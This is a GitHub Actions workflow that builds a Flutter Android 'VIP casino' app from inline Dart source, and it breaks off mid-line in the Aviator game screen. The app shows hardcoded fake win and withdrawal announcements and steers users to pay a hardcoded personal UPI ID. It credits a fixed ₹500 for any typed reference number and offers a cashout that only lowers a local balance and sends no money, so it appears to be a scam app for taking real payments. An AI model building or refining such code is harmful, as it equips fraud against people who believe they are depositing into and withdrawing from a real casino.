name: DD1 VIP Casino

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Build Official APK
        run: |
          flutter create --platforms=android --org com.dd1.vip app
          cd app

          cat << 'EOF' > lib/main.dart
          import 'dart:async';
          import 'dart:math';
          import 'package:flutter/material.dart';
          import 'package:flutter/services.dart';

          void main() {
            WidgetsFlutterBinding.ensureInitialized();
            SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
            runApp(const DD1VIPApp());
          }

          const String ADMIN_UPI = "fardinkhan7860011111@okhdfcbank";

          class DD1VIPApp extends StatelessWidget {
            const DD1VIPApp({super.key});

            @override
            Widget build(BuildContext context) {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                title: 'DD1 VIP CASINO',
                theme: ThemeData.dark().copyWith(
                  scaffoldBackgroundColor: const Color(0xFF090404),
                  primaryColor: const Color(0xFFFFD700),
                ),
                home: const LobbyScreen(),
              );
            }
          }

          class LobbyScreen extends StatefulWidget {
            const LobbyScreen({super.key});
            @override
            State<LobbyScreen> createState() => _LobbyScreenState();
          }

          class _LobbyScreenState extends State<LobbyScreen> {
            static double _balance = 0.0;
            static bool _claimed = false;
            final String _uid = "VIP_7860";

            final List<String> _wins = [
              "🔥 VIP_9410 won ₹4,800 on Aviator (3.42x)",
              "💰 VIP_2104 withdrawn ₹10,000 via UPI",
              "💎 VIP_6711 opened 7 Diamonds on Mines (+₹3,150)",
              "⚡ VIP_5019 added ₹2,000 to Wallet"
            ];
            int _wIdx = 0;
            Timer? _wTimer;

            @override
            void initState() {
              super.initState();
              _wTimer = Timer.periodic(const Duration(seconds: 4), (t) {
                if (mounted) setState(() => _wIdx = (_wIdx + 1) % _wins.length);
              });

              if (!_claimed) {
                WidgetsBinding.instance.addPostFrameCallback((_) => _showBonus());
              }
            }

            @override
            void dispose() {
              _wTimer?.cancel();
              super.dispose();
            }

            void _showBonus() {
              showDialog(
                context: context,
                barrierDismissible: false,
                builder: (ctx) => AlertDialog(
                  backgroundColor: const Color(0xFF1E0A0A),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: const BorderSide(color: Color(0xFFFFD700))),
                  title: const Column(
                    children: [
                      Icon(Icons.military_tech, color: Color(0xFFFFD700), size: 50),
                      SizedBox(height: 8),
                      Text('VIP WELCOME BONUS', style: TextStyle(color: Color(0xFFFFD700), fontWeight: FontWeight.bold, fontSize: 18)),
                    ],
                  ),
                  content: const Text('Claim your ₹50 Free VIP chips to start playing!', textAlign: TextAlign.center, style: TextStyle(color: Colors.white70)),
                  actions: [
                    SizedBox(
                      width: double.infinity,
                      child: ElevatedButton(
                        style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFFFFD700)),
                        onPressed: () {
                          HapticFeedback.mediumImpact();
                          setState(() {
                            _claimed = true;
                            _balance += 50;
                          });
                          Navigator.pop(ctx);
                        },
                        child: const Text('CLAIM ₹50', style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
                      ),
                    )
                  ],
                ),
              );
            }

            void _deposit() {
              final utrCtrl = TextEditingController();
              showModalBottomSheet(
                context: context,
                isScrollControlled: true,
                backgroundColor: const Color(0xFF140606),
                shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
                builder: (ctx) => Padding(
                  padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom, left: 20, right: 20, top: 20),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(width: 40, height: 4, decoration: BoxDecoration(color: Colors.white24, borderRadius: BorderRadius.circular(2))),
                      const SizedBox(height: 14),
                      const Text('SCAN UPI QR CODE', style: TextStyle(color: Color(0xFFFFD700), fontSize: 16, fontWeight: FontWeight.bold)),
                      const SizedBox(height: 14),
                      Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(color: Colors.white, borderRadius: BorderRadius.circular(16)),
                        child: CustomPaint(size: const Size(160, 160), painter: SimpleQRPainter()),
                      ),
                      const SizedBox(height: 12),
                      InkWell(
                        onTap: () {
                          Clipboard.setData(const ClipboardData(text: ADMIN_UPI));
                          HapticFeedback.lightImpact();
                          ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('UPI Copied!')));
                        },
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                          decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(8)),
                          child: const Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Text(ADMIN_UPI, style: TextStyle(color: Color(0xFFFFD700), fontWeight: FontWeight.bold)),
                              SizedBox(width: 8),
                              Icon(Icons.copy, size: 16, color: Color(0xFFFFD700)),
                            ],
                          ),
                        ),
                      ),
                      const SizedBox(height: 16),
                      TextField(
                        controller: utrCtrl,
                        keyboardType: TextInputType.number,
                        decoration: InputDecoration(
                          filled: true,
                          fillColor: const Color(0xFF220808),
                          hintText: 'Enter 12-Digit UTR / Ref No.',
                          hintStyle: const TextStyle(color: Colors.white38),
                          border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                        ),
                      ),
                      const SizedBox(height: 14),
                      SizedBox(
                        width: double.infinity,
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(backgroundColor: Colors.green, padding: const EdgeInsets.symmetric(vertical: 14), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
                          onPressed: () {
                            if (utrCtrl.text.trim().length >= 6) {
                              HapticFeedback.heavyImpact();
                              setState(() => _balance += 500);
                              Navigator.pop(ctx);
                              ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Deposit Request Submitted!')));
                            }
                          },
                          child: const Text('SUBMIT TRANSACTION', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                        ),
                      ),
                      const SizedBox(height: 24),
                    ],
                  ),
                ),
              );
            }

            void _withdraw() {
              final amt = TextEditingController();
              final upi = TextEditingController();
              showModalBottomSheet(
                context: context,
                isScrollControlled: true,
                backgroundColor: const Color(0xFF140606),
                shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(24))),
                builder: (ctx) => Padding(
                  padding: EdgeInsets.only(bottom: MediaQuery.of(ctx).viewInsets.bottom, left: 20, right: 20, top: 20),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Text('CASHOUT TO UPI', style: TextStyle(color: Color(0xFFFFD700), fontSize: 16, fontWeight: FontWeight.bold)),
                      const SizedBox(height: 14),
                      TextField(controller: amt, keyboardType: TextInputType.number, decoration: const InputDecoration(hintText: 'Amount (Min ₹100)', filled: true, fillColor: Color(0xFF220808))),
                      const SizedBox(height: 10),
                      TextField(controller: upi, decoration: const InputDecoration(hintText: 'Your UPI ID (abc@bank)', filled: true, fillColor: Color(0xFF220808))),
                      const SizedBox(height: 14),
                      SizedBox(
                        width: double.infinity,
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent, padding: const EdgeInsets.symmetric(vertical: 14)),
                          onPressed: () {
                            double req = double.tryParse(amt.text) ?? 0;
                            if (req >= 100 && req <= _balance && upi.text.contains('@')) {
                              HapticFeedback.heavyImpact();
                              setState(() => _balance -= req);
                              Navigator.pop(ctx);
                              ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Cashout Submitted!')));
                            }
                          },
                          child: const Text('CONFIRM CASHOUT', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                        ),
                      ),
                      const SizedBox(height: 24),
                    ],
                  ),
                ),
              );
            }

            @override
            Widget build(BuildContext context) {
              return Scaffold(
                appBar: AppBar(
                  backgroundColor: const Color(0xFF140505),
                  elevation: 0,
                  title: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 4),
                        decoration: BoxDecoration(color: const Color(0xFFFFD700), borderRadius: BorderRadius.circular(6)),
                        child: const Text('DD1', style: TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontSize: 13)),
                      ),
                      const SizedBox(width: 8),
                      const Text('VIP CASINO', style: TextStyle(color: Color(0xFFFFD700), fontWeight: FontWeight.bold, fontSize: 17)),
                    ],
                  ),
                  actions: [
                    IconButton(icon: const Icon(Icons.account_balance_wallet, color: Colors.amber), onPressed: _withdraw),
                  ],
                ),
                body: ListView(
                  padding: const EdgeInsets.all(16),
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      decoration: BoxDecoration(color: const Color(0xFF1E0808), borderRadius: BorderRadius.circular(8), border: Border.all(color: Colors.amber.withOpacity(0.2))),
                      child: Row(
                        children: [
                          const Icon(Icons.campaign, color: Colors.amber, size: 18),
                          const SizedBox(width: 8),
                          Expanded(child: Text(_wins[_wIdx], style: const TextStyle(color: Colors.amberAccent, fontSize: 12, fontWeight: FontWeight.bold))),
                        ],
                      ),
                    ),
                    const SizedBox(height: 16),
                    Container(
                      padding: const EdgeInsets.all(18),
                      decoration: BoxDecoration(
                        gradient: const LinearGradient(colors: [Color(0xFF280B0B), Color(0xFF120404)]),
                        borderRadius: BorderRadius.circular(18),
                        border: Border.all(color: const Color(0xFFFFD700).withOpacity(0.35)),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(_uid, style: const TextStyle(color: Colors.white54, fontSize: 12)),
                              const SizedBox(height: 4),
                              Text('₹ ${_balance.toStringAsFixed(2)}', style: const TextStyle(color: Color(0xFFFFD700), fontSize: 26, fontWeight: FontWeight.bold)),
                            ],
                          ),
                          ElevatedButton.icon(
                            style: ElevatedButton.styleFrom(backgroundColor: Colors.green, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))),
                            onPressed: _deposit,
                            icon: const Icon(Icons.qr_code, size: 18),
                            label: const Text('DEPOSIT'),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 22),
                    const Text('POPULAR GAMES', style: TextStyle(color: Colors.white70, fontWeight: FontWeight.bold, fontSize: 13, letterSpacing: 1)),
                    const SizedBox(height: 12),
                    _gameCard('AVIATOR 🚀', 'CRASH ENGINE (UP TO 100X)', Colors.redAccent, () async {
                      final res = await Navigator.push(context, MaterialPageRoute(builder: (_) => AviatorGame(balance: _balance)));
                      if (res != null) setState(() => _balance = res);
                    }),
                    const SizedBox(height: 14),
                    _gameCard('MINES PRO 💎', '25 GRID DIAMOND REVEAL', Colors.amber, () async {
                      final res = await Navigator.push(context, MaterialPageRoute(builder: (_) => MinesGame(balance: _balance)));
                      if (res != null) setState(() => _balance = res);
                    }),
                  ],
                ),
              );
            }

            Widget _gameCard(String title, String tag, Color accent, VoidCallback onTap) {
              return InkWell(
                onTap: onTap,
                borderRadius: BorderRadius.circular(16),
                child: Container(
                  padding: const EdgeInsets.all(18),
                  decoration: BoxDecoration(color: const Color(0xFF180707), borderRadius: BorderRadius.circular(16), border: Border.all(color: accent.withOpacity(0.35))),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
                          const SizedBox(height: 4),
                          Text(tag, style: TextStyle(color: accent, fontSize: 11)),
                        ],
                      ),
                      const Icon(Icons.play_circle_filled, color: Color(0xFFFFD700), size: 36),
                    ],
                  ),
                ),
              );
            }
          }

          class AviatorGame extends StatefulWidget {
            final double balance;
            const AviatorGame({super.key, required this.balance});
            @override
            State<AviatorGame> createState() => _AviatorGameState();
          }

          class _AviatorGameState extends State<AviatorGame> {
            late double _bal;
            double _m = 1.0;
            bool _fly = false;
            Timer? _t;

            @override
            void initState() {
              super.initState();
              _bal = widget.balance;
            }

            void _start() {
              if (_bal < 50) return;
              HapticFeedback.mediumImpact();
              setState(() {
                _bal -= 50;
                _fly = true;
                _m = 1.0;
              });

              double crash = 1.15 + Random().nextDouble() * 5.0;
              _t?.cancel();
              _t = Timer.periodic(const Duration(milliseconds: 65), (t) {
                setState(() {
                  _m += 0.04;
                  if (_m >= crash) {
                    t.cancel();
                    _fly = false;
                    HapticFeedback.heavyImpact();
                  }
                });
              });
            }

            void _cashout() {
              if (!_fly) return;
              _t?.cancel();
              HapticFeedback.mediumImpact();
              setState(() {
                _fly = false;
                _bal += (50 * _m);
              });
            }

            @override
            void dispose() {
              _t?.cancel();
              super.dispose();
            }

            @override
            Widget build(BuildContext context) {
              return WillPopScope(
                onWillPop: () async {
                  Navigator.pop(context, _bal);
                  return false;
                },
                child: Scaffold(
                  appBar: AppBar(title: const Text('AVIATOR 🚀'), backgroundColor: const Color(0xFF140505)),
                  body: Column(
                    children: [
                      Expanded(
                        child: Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.rocket_launch, size: 70, color: _fly ? Colors.redAccent : Colors.white24),
                              const SizedBox(height: 12),
                              Text('${_m.to
